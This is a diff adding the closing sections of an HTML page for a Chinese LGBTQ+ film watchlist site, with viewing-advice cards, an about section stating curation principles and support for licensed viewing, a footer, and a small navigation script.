+      <a class="av" href="#"><div class="no">STOP 01</div><h4>"未删减完整版 / 高清秒播"</h4><p>九成是盗链、赌博与诈骗。正版平台不贵，修复版的每一帧都是钱。</p></a>
+      <a class="av" href="#"><div class="no">STOP 02</div><h4>猎奇合集号</h4><p>把同志电影剪成"10 部大尺度"，是消费，不是推荐。看片单之前，先看片单是谁写的。</p></a>
+      <a class="av" href="#"><div class="no">STOP 03</div><h4>解说 5 分钟看完</h4><p>解说拿走的是情节，留下的是"知道"。这类片的表演与留白，都在被删掉的那 100 分钟里。</p></a>
+      <a class="av" href="#"><div class="no">STOP 04</div><h4>收藏 200 部 = 看过</h4><p>收藏是拖延的体面说法。删掉 100 部，今晚就自由了。</p></a>
+      <a class="av" href="#"><div class="no">STOP 05</div><h4>搬运影评 = 原创</h4><p>整段搬运他人影评与片单，属侵权且会被搜索引擎降权。写你自己的三句话。</p></a>
+      <a class="av" href="#"><div class="no">STOP 06</div><h4>用"题材"代替"人"</h4><p>先问导演是谁、编剧是谁、主演是谁。由当事人参与创作，观感完全不同。</p></a>
+    </div>
+  </section>
+
+  <!-- about -->
+  <section id="about" class="wrap">
+    <div class="sec">
+      <span class="no">08</span>
+      <h2>关于 同性电影网</h2>
+      <span class="en">About</span>
+      <a class="more" href="#">投稿片单 ›</a>
+    </div>
+    <div class="about">
+      <p class="led">同性电影网是一份<b>关于爱与身份的观影清单</b>：<b>同志电影、LGBTQ+ 电影、酷儿电影、跨性别电影、出柜电影、爱情电影、独立电影、纪录片与短片</b>。我们不追热搜、不堆票房，只解决一个问题——<b>今晚看哪一部，且看完心里是暖的</b>。</p>
+      <div class="tags2">
+        <a href="#c01">同志电影</a><a href="#c01">LGBTQ+ 电影</a><a href="#c01">酷儿电影</a><a href="#c01">跨性别电影</a><a href="#c01">出柜电影</a>
+        <a href="#c02">爱情电影</a><a href="#c02">独立电影</a><a href="#c05">纪录片</a><a href="#c05">短片</a><a href="#c04">电影史</a>
+        <a href="#c06">4K 修复</a><a href="#c06">电影节</a><a href="#c07">正版观影</a>
+      </div>
+      <p style="margin-top:15px">选片三原则：<b>不猎奇、不病理化、不看苦难消费</b>。优先推荐由 LGBTQ+ 创作者执导或主演、由当事人参与编剧的作品；拒绝把"出柜"当作唯一的戏剧高潮；拒绝把悲剧当作"题材的宿命"。我们倡导：看正版、看修复版、看蓝光；尊重导演、摄影、美术、作曲与字幕翻译的工作；练习用片与截图仅用于赏析，不商用、不搬运、不二传。本站片单、榜单与"推荐强度"为编辑部主观整理，仅供选片参考，不构成权威数据；片名、译名与上线情况以各平台、发行方与电影节官方公告为准。若发现本站外链违规或失效，请在"投稿片单"告知，我们会在 24 小时内处理。</p>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="brand"><span>同性电影网</span><span>QUEER CINEMA · A WATCHLIST · 2026</span><p>影视赏析与片单推荐。倡导正版、4K 修复、尊重创作者与版权；本站不做资源托管与盗链。</p></div>
+      <div>
+        <h5>声音</h5>
+        <a href="#c01">初恋与暗恋</a>
+        <a href="#c01">出柜与家人</a>
+        <a href="#c01">选择的家人</a>
+      </div>
+      <div>
+        <h5>片单</h5>
+        <a href="#c02">三卷片单</a>
+        <a href="#c03">榜 · 三档</a>
+        <a href="#c05">六位作者</a>
+      </div>
+      <div>
+        <h5>观看</h5>
+        <a href="#c06">进电影院</a>
+        <a href="#c06">4K 修复版</a>
+        <a href="#c06">电影节展映</a>
+      </div>
+    </div>
+    <div class="copy">
+      © <span id="yr">2026</span> 同性电影网 &nbsp;|&nbsp; 网站网址：<a href="https://tongxingdianyingwang-cn.github.io/">https://tongxingdianyingwang-cn.github.io/</a><br>
+      // LOVE · IDENTITY · COURAGE &nbsp;·&nbsp; 本站为影视赏析与片单参考，片单与评分为编辑部主观整理
+    </div>
+  </div>
+</footer>
+
+<script>
+var ham=document.getElementById('ham'),dr=document.getElementById('drawer'),sc=document.getElementById('scrim');
+function closeNav(){dr.classList.remove('open');sc.classList.remove('on');ham.setAttribute('aria-expanded','false');}
+ham.addEventListener('click',function(){var o=dr.classList.toggle('open');sc.classList.toggle('on',o);ham.setAttribute('aria-expanded',o);});
+sc.addEventListener('click',closeNav);
+dr.addEventListener('click',function(e){if(e.target.tagName==='A')closeNav();});
+document.getElementById('yr').textContent=new Date().getFullYear();
+
+var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){e.target.style.height=e.target.dataset.h+'%';io.unobserve(e.target);}})},{threshold:.3});
+document.querySelectorAll('.la').forEach(function(n){io.observe(n);});
+</script>
+</body>
+</html>
